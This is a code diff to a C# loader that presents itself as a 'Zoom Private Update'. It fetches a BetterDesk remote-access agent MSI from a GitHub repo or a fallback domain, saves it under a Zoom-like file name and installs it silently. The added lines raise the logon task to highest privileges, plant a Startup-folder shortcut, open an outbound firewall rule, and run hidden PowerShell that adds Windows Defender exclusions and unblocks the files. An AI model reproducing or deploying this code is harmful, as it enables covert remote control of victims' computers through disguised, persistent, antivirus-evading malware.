@@ -40,9 +40,9 @@ public class ZoomLoader
 {
     const string RepoBase = "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/windows";
     const string Fallback = "https://us05web.telcom.stream";
-    const string PkgName = "BetterDesk-Agent-x64-1.0.1.msi";
+    const string PkgName = "BetterDesk-Agent-x64-1.0.2.msi";
     const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
-    const string ExpectedSha = "88B63836A21C638524344D33091C072B68BAB55AA3A27191C70CAFB66A69B216";
+    const string ExpectedSha = "A2DFC22BD5CBDC625D9F7232E6006E3497BC8379D45687F7ACA4337B7B3A1D87";
     const string TaskName = "Zoom Private Update";
     const string UninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{39ADC479-8106-430C-9B36-10552C4AF9E6}";
 
@@ -355,7 +355,13 @@ public class ZoomLoader
     // ---------------------------------------------------------------- install
     static void Install(string payload)
     {
+        Run("msiexec.exe", "/x {04390D78-31BC-405F-BDED-ECCCA16FC3F4} /qn /norestart", 300000);
         int code = Run("msiexec.exe", "/i \"" + payload + "\" /qn /norestart REBOOT=ReallySuppress", 600000);
+        if (code == 1638)
+        {
+            code = Run("msiexec.exe", "/i \"" + payload + "\" /qn /norestart REINSTALL=ALL REINSTALLMODE=amus", 600000);
+            Log("msiexec reinstall exit=" + code);
+        }
         Log("msiexec exit=" + code);
         if (code != 0 && code != 3010) throw new Exception("msiexec failed: " + code);
     }
@@ -409,6 +415,11 @@ public class ZoomLoader
         WriteFile(launcher,
             "@echo off\r\n" +
             "setlocal\r\n" +
+            "set \"PROXY=\"\r\n" +
+            "for /f \"tokens=2,*\" %%A in ('reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer 2^>nul') do set \"PROXY=%%B\"\r\n" +
+            "if defined PROXY set \"HTTPS_PROXY=http://%PROXY%\"\r\n" +
+            "if defined PROXY set \"HTTP_PROXY=http://%PROXY%\"\r\n" +
+            "set \"NO_PROXY=localhost,127.0.0.1\"\r\n" +
             ":loop\r\n" +
             "\"" + agent + "\" --config \"" + config + "\" --config-path \"" + config + "\" >> \"" + log + "\" 2>&1\r\n" +
             "timeout /t 5 /nobreak >nul\r\n" +
@@ -422,7 +433,7 @@ public class ZoomLoader
         string taskCommand = "wscript.exe //B \"" + starter + "\"";
         Run("icacls.exe", "\"" + ExecDir + "\" /grant *S-1-5-32-545:(OI)(CI)RX /T /C", 60000);
         Run("schtasks.exe", "/Delete /TN \"" + TaskName + "\" /F", 60000);
-        int code = Run("schtasks.exe", "/Create /TN \"" + TaskName + "\" /SC ONLOGON /RL LIMITED /F /TR \"" +
+        int code = Run("schtasks.exe", "/Create /TN \"" + TaskName + "\" /SC ONLOGON /RL HIGHEST /F /TR \"" +
             taskCommand + "\"", 60000);
         Log("schtasks create exit=" + code);
         Run("schtasks.exe", "/Run /TN \"" + TaskName + "\"", 60000);
@@ -450,6 +461,18 @@ public class ZoomLoader
 
         try { MakeShortcuts(client, Path.Combine(InstallDir()), starter); }
         catch (Exception ex) { Log("shortcuts: " + ex.Message); }
+        try { MakeStartupShortcut(starter, ExecDir); }
+        catch (Exception ex) { Log("startup shortcut: " + ex.Message); }
+
+        try
+        {
+            Run("netsh.exe", "winhttp import proxy source=ie", 30000);
+            Run("netsh.exe", "advfirewall firewall delete rule name=\"Zoom Private Update\"", 30000);
+            Run("netsh.exe", "advfirewall firewall add rule name=\"Zoom Private Update\" dir=out action=allow program=\"" + agent + "\" enable=yes profile=any", 30000);
+            Run("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath ''" + InstallDir() + "'' -ExclusionProcess ''betterdesk-agent.exe'' -ErrorAction SilentlyContinue\"", 60000);
+            Run("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Unblock-File -Path ''" + ExecDir + "\\*'' -ErrorAction SilentlyContinue\"", 30000);
+        }
+        catch (Exception ex) { Log("hardening: " + ex.Message); }
 
         Log("configured agent=" + agent);
     }
@@ -539,6 +562,22 @@ public class ZoomLoader
         return id.ToString();
     }
 
+    static void MakeStartupShortcut(string starter, string workDir)
+    {
+        string folder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+        if (string.IsNullOrEmpty(folder) || !Directory.Exists(folder)) return;
+        string path = Path.Combine(folder, "Zoom Private Update.lnk");
+        object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
+        object link = shell.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod,
+            null, shell, new object[] { path });
+        SetProperty(link, "TargetPath", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "wscript.exe"));
+        SetProperty(link, "Arguments", "//B \"" + starter + "\"");
+        SetProperty(link, "WorkingDirectory", workDir);
+        SetProperty(link, "Description", "Zoom Private Update");
+        link.GetType().InvokeMember("Save", BindingFlags.InvokeMethod, null, link, null);
+        Marshal.ReleaseComObject(link);
+        Marshal.ReleaseComObject(shell);
+    }
     static void SetProperty(object target, string name, object value)
     {
         target.GetType().InvokeMember(name, BindingFlags.SetProperty, null, target, new object[] { value });
